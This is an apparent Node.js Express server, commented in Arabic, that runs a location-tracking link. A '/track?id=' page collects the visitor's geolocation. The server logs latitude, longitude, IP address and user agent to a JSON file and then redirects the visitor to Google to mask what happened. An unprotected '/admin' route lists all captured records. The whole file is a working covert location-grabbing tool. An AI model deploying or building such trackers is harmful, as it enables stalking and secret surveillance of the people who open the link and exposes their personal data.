const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// مسار ملف قاعدة البيانات البسيطة
const dbFile = path.join(__dirname, 'locations.json');

// دالة لقراءة البيانات من الملف
const readData = () => {
    if (!fs.existsSync(dbFile)) {
        fs.writeFileSync(dbFile, JSON.stringify([]));
    }
    const data = fs.readFileSync(dbFile, 'utf8');
    return JSON.parse(data);
};

// دالة لكتابة البيانات إلى الملف
const writeData = (data) => {
    fs.writeFileSync(dbFile, JSON.stringify(data, null, 2));
};

// صفحة الاستقبال: عندما يفتح المستخدم الرابط
app.get('/track', (req, res) => {
    const id = req.query.id;
    if (!id) {
        return res.send('معرف غير صالح');
    }
    // نرسل له صفحة HTML التي ستجمع الموقع
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// نقطة نهاية API لتلقي الموقع من المتصفح
app.post('/api/location', (req, res) => {
    const { id, latitude, longitude, accuracy } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const locationData = {
        id,
        latitude,
        longitude,
        accuracy,
        ip,
        userAgent,
        timestamp
    };

    // قراءة البيانات الحالية وإضافة الجديدة
    const locations = readData();
    locations.push(locationData);
    writeData(locations);

    console.log('تم استلام الموقع:', locationData);

    // يمكنك توجيه المستخدم إلى أي صفحة تريد بعد الحصول على الموقع
    // هنا سنوجهه إلى Google كمثال
    res.json({ redirectUrl: 'https://www.google.com' });
});

// صفحة لعرض البيانات المسجلة (للإدارة)
app.get('/admin', (req, res) => {
    const locations = readData();
    res.json(locations);
});

// صفحة الرئيسية
app.get('/', (req, res) => {
    res.send('مرحباً، استخدم رابط التتبع مثل /track?id=123456');
});

app.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
